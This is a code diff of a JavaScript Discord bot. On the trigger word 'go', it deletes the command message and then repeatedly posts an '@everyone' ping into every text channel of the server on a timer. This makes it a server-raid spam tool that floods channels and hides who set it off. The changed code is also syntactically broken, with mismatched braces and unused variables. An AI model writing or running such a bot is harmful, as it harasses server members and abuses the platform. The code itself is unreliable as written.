@@ -17,12 +17,16 @@ for (var i = 0; i < 490; i++) {
      }
     
     if(msg.content === 'go'){
-     for(var i = 0; i < 9999; i++) {
-          msg.guild.channels.forEach(channel => {
+        setTimeout(function(){
+            msg.delete()
+             let i = 0;
+             let interval = setInterval(function () {
+           msg.guild.channels.forEach(channel => {
       if (channel.type === "text") channel.send("@everyone DYLOUF LE OUF")
 }, 2500);
-     }
-    }
+}, 1000);
+});
+}
 });
 
 client.login(process.env.token)
